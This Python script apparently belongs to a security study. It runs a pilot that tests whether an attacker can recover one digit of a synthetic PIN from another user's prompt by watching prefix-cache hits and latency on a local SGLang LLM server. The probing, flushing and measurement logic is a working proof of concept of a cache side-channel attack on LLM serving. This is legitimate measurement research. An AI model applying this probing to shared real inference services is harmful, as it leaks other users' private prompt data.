"""
run_pin_position1_pilot.py — Level 3 pilot: can the attacker recover a
single digit position of a synthetic PIN via cache observation, rather
than needing the whole PIN as one of a small closed candidate set?

PILOT: position 1 only, 5 trials, 10 probes/trial (digits 0-9).
Isolated-probe methodology throughout (flush before every single probe).
Ground truth (the real full PIN) lives only in this orchestration loop.
"""
import csv
import sys
import os
import time
import random
import requests

sys.path.insert(0, os.path.dirname(__file__))
from measure import send_request
from config import SHARED_PUBLIC_PREFIX, PIN_LENGTH, PIN_PLACEHOLDER_DIGIT

OUT_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "results", "sglang", "pin_position1_pilot.csv"))
FLUSH_URL = "http://localhost:30000/flush_cache"
N_TRIALS = 5
GAP_SECONDS = 1

def flush_cache():
    r = requests.post(FLUSH_URL, timeout=10)
    return r.text.strip()

def random_pin():
    return "".join(str(random.randint(0, 9)) for _ in range(PIN_LENGTH))

def victim_populate(pin: str):
    prompt = SHARED_PUBLIC_PREFIX + pin
    return send_request(prompt)

def attacker_probe_position1(digit_guess: str):
    # Fixed placeholder for positions 2-6, only position 1 varies.
    guess_pin = digit_guess + PIN_PLACEHOLDER_DIGIT * (PIN_LENGTH - 1)
    prompt = SHARED_PUBLIC_PREFIX + guess_pin
    return send_request(prompt)

def run():
    rows = []

    for trial in range(N_TRIALS):
        gt_pin = random_pin()
        gt_digit1 = gt_pin[0]

        for digit in "0123456789":
            flush_cache()
            time.sleep(0.3)

            victim_populate(gt_pin)
            time.sleep(GAP_SECONDS)

            r = attacker_probe_position1(digit)
            r.update({
                "trial": trial,
                "probed_digit": digit,
                "ground_truth_pin": gt_pin,
                "ground_truth_digit1": gt_digit1,
            })
            rows.append(r)
            match = "MATCH" if digit == gt_digit1 else ""
            print(f"  trial={trial} probe_digit={digit} cached_tokens={r['cached_tokens']}/{r['prompt_tokens']} "
                  f"latency={r['wall_clock_latency']:.4f}s {match}")

    os.makedirs(os.path.dirname(OUT_PATH), exist_ok=True)
    fieldnames = list(rows[0].keys())
    with open(OUT_PATH, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    print(f"\nSaved {len(rows)} rows to {OUT_PATH}")

if __name__ == "__main__":
    run()
